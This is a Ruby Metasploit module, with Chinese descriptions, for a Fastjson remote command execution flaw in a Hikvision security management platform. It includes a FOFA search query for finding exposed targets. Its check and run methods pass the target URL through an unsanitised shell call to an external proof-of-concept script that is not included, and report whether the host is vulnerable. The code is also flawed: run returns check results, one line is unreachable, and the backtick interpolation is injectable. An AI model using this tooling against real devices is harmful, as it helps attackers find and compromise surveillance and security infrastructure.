#fofa: app="HIKVISION-综合安防管理平台"

require 'msf/core'

class MetasploitModule < Msf::Auxiliary
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
                      'Name'           => '海康威视综合安防Fastjson远程命令执行漏洞',
                      'Description'    => %q{
        这个模块利用了Fastjson远程命令执行漏洞,攻击者通过漏洞可以获取服务器权限.
      },
                      'Author'         => ['se2o'],
                      'License'        => MSF_LICENSE,
                      'References'     =>
                        [
                          [ 'TY', '2023-0830' ]
                        ],
                      'DisclosureDate' => 'Apr 26 2023',
                      'DefaultOptions' => { 'SSL' => false },
                      'Platform'       => 'win',
                      'Targets'        => [['Automatic', {}]],
                      'DefaultTarget'  => 0))

    register_options(
      [
        OptString.new('service', [true, 'http/https', 'http'])
      ])
  end

  def run_command(command)
    result = ""
    result = `#{command}`.chomp
    result
  end

  def check
    #ssl = datastore['service']

    #protocol = ssl ? 'https' : 'http'
    protocol = datastore['service']
    rhost = datastore['RHOST']
    rport = datastore['RPORT']

    #url = if ssl
    #    "#{protocol}://#{rhost}:#{rport}"
    #  else
    #    "#{protocol}://#{rhost}:#{rport}"
    #  end

    url = "#{protocol}://#{rhost}:#{rport}"

    command = "python /root/msf-py/py.poc/ty-2023-0830/ty-2023-0830-poc.py -u #{url}"
    output = run_command(command)
    #result = `#{cmd}`

    if output == "true"
      return Exploit::CheckCode::Vulnerable
    elsif output == "false"
      return Exploit::CheckCode::Safe
    else
      print_good("无法确定漏洞状态")
      return Exploit::CheckCode::Safe
    end
  end

  def run
    ssl = datastore['SSL']

    protocol = ssl ? 'https' : 'http'
    rhost = datastore['RHOST']
    rport = datastore['RPORT']

    url = if ssl
            "#{protocol}://#{rhost}:#{rport}"
          else
            "#{protocol}://#{rhost}:#{rport}"
          end

    command = "python /root/msf-py/py.poc/ty-2023-0830/ty-2023-0830-poc.py -u #{url}"
    output = run_command(command)
    #result = `#{cmd}`
    print_good("Data collection checkpoint start")
    if output == "true"
      return Exploit::CheckCode::Vulnerable
    elsif output == "false"
      return Exploit::CheckCode::Safe
    else
      print_good("无法确定漏洞状态")
      return Exploit::CheckCode::Safe
      print_good("Data collection checkpoint end")
    end
  end
end
